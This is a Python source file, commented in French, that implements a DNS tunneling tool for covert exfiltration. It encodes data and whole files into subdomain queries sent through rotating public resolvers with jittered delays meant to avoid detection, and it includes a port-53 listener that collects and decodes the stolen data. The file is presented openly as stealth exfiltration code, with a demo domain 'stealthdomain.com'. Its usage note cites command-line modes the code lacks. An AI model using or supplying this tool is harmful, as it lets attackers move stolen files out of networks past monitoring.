"""
DNS Tunneling - Communication furtive via requêtes DNS
Encode les données dans les noms de domaine pour exfiltration discrète
"""
import base64
import socket
import time
import random
from typing import List, Optional, Tuple
import dnslib
from dnslib import DNSRecord, DNSHeader, DNSQuestion, QTYPE


class DNSTunnel:
    """
    Tunnel DNS pour communication furtive
    
    Encode les données en sous-domaines:
    data1.data2.data3.domain.com
    
    Permet d'exfiltrer des données sans éveiller les soupçons
    car le trafic DNS est rarement filtré
    """
    
    def __init__(self, base_domain: str = "example.com", max_label_len: int = 63):
        """
        Args:
            base_domain: Domaine de base contrôlé
            max_label_len: Longueur max d'un label DNS (RFC 1035: 63)
        """
        self.base_domain = base_domain
        self.max_label_len = max_label_len
        self.max_chunk_size = max_label_len - 10  # Garde de la marge pour encodage
        self.dns_servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']  # Serveurs DNS publics
    
    def encode_data_to_dns(self, data: bytes) -> List[str]:
        """
        Encode des données en requêtes DNS
        
        Args:
            data: Données binaires à encoder
        
        Returns:
            Liste de noms de domaine à requêter
        """
        # Encodage Base32 (plus sûr pour DNS que Base64)
        encoded = base64.b32encode(data).decode().lower().replace('=', '')
        
        # Découpage en chunks
        chunks = []
        for i in range(0, len(encoded), self.max_chunk_size):
            chunk = encoded[i:i + self.max_chunk_size]
            chunks.append(chunk)
        
        # Construction des noms de domaine
        domains = []
        for i, chunk in enumerate(chunks):
            # Format: seq-chunk.session_id.base_domain
            session_id = self._generate_session_id()
            domain = f"{i:03d}-{chunk}.{session_id}.{self.base_domain}"
            domains.append(domain)
        
        return domains
    
    def decode_from_dns(self, domains: List[str]) -> bytes:
        """
        Décode des données depuis des noms de domaine DNS
        
        Args:
            domains: Liste de noms de domaine reçus
        
        Returns:
            Données décodées
        """
        # Extraction des chunks
        chunks = []
        for domain in domains:
            # Parse le domaine
            parts = domain.split('.')
            if len(parts) >= 3:
                # Extraction du chunk (seq-data)
                chunk_part = parts[0]
                if '-' in chunk_part:
                    _, chunk_data = chunk_part.split('-', 1)
                    chunks.append(chunk_data)
        
        # Tri par séquence (déjà fait si bien formé)
        # Concaténation
        encoded = ''.join(chunks).upper()
        
        # Padding Base32
        padding_needed = (8 - len(encoded) % 8) % 8
        encoded += '=' * padding_needed
        
        # Décodage
        try:
            decoded = base64.b32decode(encoded)
            return decoded
        except Exception as e:
            print(f"[DNSTunnel] Decode error: {e}")
            return b''
    
    def send_via_dns(self, data: bytes, delay: float = 0.5) -> bool:
        """
        Envoie des données via DNS tunneling
        
        Args:
            data: Données à envoyer
            delay: Délai entre requêtes (secondes)
        
        Returns:
            True si succès
        """
        domains = self.encode_data_to_dns(data)
        
        print(f"[DNSTunnel] Sending {len(data)} bytes via {len(domains)} DNS queries")
        
        for domain in domains:
            try:
                # Sélection aléatoire d'un serveur DNS
                dns_server = random.choice(self.dns_servers)
                
                # Requête DNS de type A
                self._query_dns(domain, dns_server)
                
                # Délai entre requêtes pour éviter la détection
                time.sleep(delay + random.uniform(-0.1, 0.1))
                
            except Exception as e:
                print(f"[DNSTunnel] Query failed for {domain}: {e}")
                return False
        
        print(f"[DNSTunnel] ✓ Data sent successfully")
        return True
    
    def _query_dns(self, domain: str, server: str = '8.8.8.8', port: int = 53) -> Optional[str]:
        """
        Effectue une requête DNS
        
        Args:
            domain: Nom de domaine
            server: Serveur DNS
            port: Port DNS (défaut: 53)
        
        Returns:
            Réponse IP ou None
        """
        try:
            # Construction de la requête DNS
            qname = dnslib.DNSLabel(domain)
            q = DNSRecord(q=DNSQuestion(qname, QTYPE.A))
            
            # Envoi via UDP
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2.0)
            
            sock.sendto(q.pack(), (server, port))
            
            # Réception de la réponse
            response_data, _ = sock.recvfrom(512)
            response = DNSRecord.parse(response_data)
            
            sock.close()
            
            # Extraction de la réponse
            if response.rr:
                return str(response.rr[0].rdata)
            
            return None
            
        except socket.timeout:
            print(f"[DNSTunnel] DNS query timeout for {domain}")
            return None
        except Exception as e:
            print(f"[DNSTunnel] DNS query error: {e}")
            return None
    
    def _generate_session_id(self) -> str:
        """Génère un ID de session unique"""
        return base64.b32encode(random.randbytes(5)).decode().lower().replace('=', '')
    
    def start_dns_listener(self, interface: str = '0.0.0.0', port: int = 53):
        """
        Démarre un serveur DNS pour recevoir les données tunnelées
        
        Args:
            interface: Interface d'écoute
            port: Port DNS
        
        Note: Nécessite des privilèges root pour port 53
        """
        print(f"[DNSTunnel] Starting DNS listener on {interface}:{port}")
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            sock.bind((interface, port))
        except PermissionError:
            print(f"[DNSTunnel] ERROR: Need root privileges to bind on port {port}")
            return
        
        received_domains = []
        
        print(f"[DNSTunnel] DNS listener active, waiting for queries...")
        
        try:
            while True:
                data, addr = sock.recvfrom(512)
                
                # Parse la requête DNS
                try:
                    request = DNSRecord.parse(data)
                    
                    # Extraction du nom de domaine
                    qname = str(request.q.qname)
                    
                    print(f"[DNSTunnel] Received query for: {qname} from {addr[0]}")
                    
                    # Si c'est pour notre domaine, enregistrer
                    if self.base_domain in qname:
                        received_domains.append(qname)
                        print(f"[DNSTunnel] Captured tunnel data: {qname}")
                    
                    # Répondre avec une IP factice
                    reply = request.reply()
                    reply.add_answer(
                        dnslib.RR(
                            request.q.qname,
                            QTYPE.A,
                            rdata=dnslib.A("127.0.0.1"),
                            ttl=60
                        )
                    )
                    
                    sock.sendto(reply.pack(), addr)
                    
                except Exception as e:
                    print(f"[DNSTunnel] Error processing DNS query: {e}")
        
        except KeyboardInterrupt:
            print(f"\n[DNSTunnel] Listener stopped. Received {len(received_domains)} queries")
            
            # Tentative de décodage
            if received_domains:
                print("[DNSTunnel] Attempting to decode received data...")
                decoded = self.decode_from_dns(received_domains)
                print(f"[DNSTunnel] Decoded data: {decoded[:100]}")
        
        finally:
            sock.close()


class DNSExfiltrator:
    """Classe d'aide pour exfiltration de données via DNS"""
    
    @staticmethod
    def exfiltrate_file(file_path: str, base_domain: str, delay: float = 1.0) -> bool:
        """
        Exfiltre un fichier via DNS
        
        Args:
            file_path: Chemin du fichier
            base_domain: Domaine de base
            delay: Délai entre requêtes
        
        Returns:
            True si succès
        """
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            tunnel = DNSTunnel(base_domain=base_domain)
            return tunnel.send_via_dns(data, delay=delay)
            
        except Exception as e:
            print(f"[DNSExfiltrator] Failed to exfiltrate file: {e}")
            return False
    
    @staticmethod
    def exfiltrate_text(text: str, base_domain: str, delay: float = 0.5) -> bool:
        """
        Exfiltre du texte via DNS
        
        Args:
            text: Texte à exfiltrer
            base_domain: Domaine de base
            delay: Délai entre requêtes
        
        Returns:
            True si succès
        """
        tunnel = DNSTunnel(base_domain=base_domain)
        return tunnel.send_via_dns(text.encode(), delay=delay)


if __name__ == '__main__':
    # Test du DNS tunneling
    print("=== DNS Tunnel Test ===\n")
    
    # Configuration
    tunnel = DNSTunnel(base_domain="stealthdomain.com")
    
    # Données de test
    test_data = b"Secret message to exfiltrate via DNS"
    
    # Test 1: Encodage
    print("1. Encoding data to DNS queries...")
    domains = tunnel.encode_data_to_dns(test_data)
    print(f"Generated {len(domains)} DNS queries:")
    for domain in domains[:3]:
        print(f"  - {domain}")
    if len(domains) > 3:
        print(f"  ... and {len(domains) - 3} more")
    
    # Test 2: Décodage
    print("\n2. Decoding data from DNS queries...")
    decoded = tunnel.decode_from_dns(domains)
    print(f"Decoded: {decoded}")
    print(f"Match: {decoded == test_data}")
    
    # Test 3: Requête DNS réelle (optionnel)
    print("\n3. Testing real DNS query...")
    result = tunnel._query_dns("google.com", "8.8.8.8")
    print(f"google.com resolves to: {result}")
    
    print("\n✓ Test complete")
    print("\nNote: To test full exfiltration, run:")
    print("  - Receiver: sudo python3 dns_tunnel.py listen")
    print("  - Sender: python3 dns_tunnel.py send 'your-data'")
